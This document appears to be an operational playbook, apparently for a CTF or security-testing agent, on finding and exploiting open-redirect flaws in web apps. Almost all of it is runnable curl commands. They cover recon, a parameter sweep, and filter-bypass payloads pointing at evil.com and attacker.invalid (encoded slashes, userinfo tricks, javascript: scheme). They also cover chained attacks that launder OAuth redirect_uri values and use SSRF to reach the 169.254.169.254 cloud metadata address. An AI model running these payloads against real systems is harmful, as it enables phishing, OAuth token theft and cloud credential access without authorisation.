# Workflow (deep) — the full operational procedure

## Phase 0 — the recon and the surface inventory

```bash
# the app's redirect vocabulary — the bundle + the pages
curl -s "$BASE/" | grep -oiE '(next|redirect|return|returnTo|goto|continue|url|redir|callback|dest|target|out|link|back|prev|view|RelayState|post_logout_redirect_uri)[="]'
curl -s "$BASE/app.js" | grep -oE 'location\.(href|replace|assign|hash)\s*=\s*[^;]*'
# the endpoint inventory — the redirect-prone flows
for ep in /login /logout /oauth/authorize /sso /out /goto /link /r /u \
          /redirect /return /back /error /img /fetch /proxy /share /qr; do
  curl -si --max-time 5 "$BASE$ep" -o /dev/null -w "%{http_code} $ep\n"
done
```

## Phase 1 — the param × endpoint matrix

```bash
# the systematic sweep — every endpoint × the param vocabulary
for ep in /login /logout /oauth/authorize /out /goto /link /back /error; do
  for p in next url redir redirect return returnTo goto continue callback to out link back RelayState; do
    loc=$(curl -si --max-time 5 "$BASE$ep?$p=https%3A%2F%2Fattacker.invalid" \
          | grep -i '^location' | head -1)
    [ -n "$loc" ] && echo "[SIGNAL] $ep ?$p -> $loc"
  done
done
```

Every `[SIGNAL]` is a param that reaches a `Location:` — the surface.

## Phase 2 — the fingerprint read

```bash
# the ONE canary — the Location names the filter
curl -si "$BASE/login?next=https%3A%2F%2Fattacker.invalid" | grep -i '^location'
```

The fingerprint table:

| The Location | The filter | The arms |
|---|---|---|
| `Location: <canary>` | none/broken | the chain-route |
| `Location: /` | forced-relative | `//`/`\`/`%5c`/scheme arms |
| `Location: https://target.com/...` | a host-force | `@`/substring/subdomain arms |
| `Location: <partial>` | a path-force | the suffix/substring arms |

## Phase 3 — the filter-shape-specific arms

```bash
# the `//`/`\`/userinfo/subdomain/encoded/scheme arms — by the fingerprint
curl -si "$BASE/login?next=%2f%2fevil.com" | grep -i location
curl -si "$BASE/login?next=%5c%5cevil.com" | grep -i location
curl -si "$BASE/login?next=%2f%5cevil.com" | grep -i location
curl -si "$BASE/login?next=https%3a%2f%2ftarget.com%40evil.com" | grep -i location
curl -si "$BASE/login?next=https%3a%2f%2fevil.com%5c%40target.com" | grep -i location
curl -si "$BASE/login?next=https%3a%2f%2ftarget.com.evil.com" | grep -i location
curl -si "$BASE/login?next=https%3a%2f%2fevil.com%2ftarget.com" | grep -i location
curl -si "$BASE/login?next=https%3a%2f%2fevil.com%3ftarget.com" | grep -i location
curl -si "$BASE/login?next=https%253a%252f%252fevil.com" | grep -i location
curl -si "$BASE/login?next=https%3a%2f%2fevil.com%ef%bc%8f%ef%bc%8ftarget.com" | grep -i location
curl -si "$BASE/login?next=javascript%3aalert(1)" | grep -i location
```

## Phase 4 — the uniform-falsifier check

```text
every arm -> Location: <safe>?  the class falsifier fires — the arms-tried
                                list + the verbatim safe Locations are the
                                falsifier's evidence
one arm -> Location: <canary>?  CANDIDATE — record verbatim, post-probe
```

## Phase 5 — the client-side pass

```bash
# the meta-refresh + the JS-nav + the DOM-sink
curl -s "$BASE/x?url=https://attacker.invalid" | grep -iE 'meta.*refresh|location\.|window\.location'
# the fragment-carried
curl -s "$BASE/app.js" | grep -oE 'location\.hash[^;]*'
```

## Phase 6 — the chain-route

```bash
# the OAuth launder
curl -si "$OAUTH/authorize?client_id=X&redirect_uri=https%3A%2F%2Ftarget.com%2Fredirect%3Fnext%3Dhttps%253A%252F%252Fattacker.invalid" | grep -i location
# the SSRF-fetch-follow
curl -s "$BASE/fetch?url=http://target.com/redirect%3Fnext%3Dhttp%3A%2F%2F169.254.169.254%2F"
# the bot-visit — report the URL, check the canary's access log
```

## Phase 7 — the record

```bash
python3 tools/hooks.py post-probe <challenge> --hypothesis-id <id> \
  --class web-open-redirect --verdict confirms --evidence-kind class \
  --evidence 'Location: https://attacker.invalid' \
  --response '<the verbatim 302>'
```

## The decision tree

```text
the param reaches a Location?
  no  -> the param name is wrong OR the carrier is client-side
        -> sweep the vocabulary / check the meta/JS
  yes -> the Location carries the canary?
    yes -> CANDIDATE -> post-probe confirms -> the chain-route
    no  -> the fingerprint names the filter -> the matching arms
      -> an arm carries the canary? -> CANDIDATE
      -> every arm -> safe? -> the class falsifier -> record + move on
```

## The budget enforcement

```text
the mechanism = the canary + the bypass arms on ONE surface — 5 probes
the challenge = every surface + every carrier — 25 probes
a uniform falsifier on all arms = the mechanism-closing signal
a confirmed canary = the class-confirm — route to the chain
```
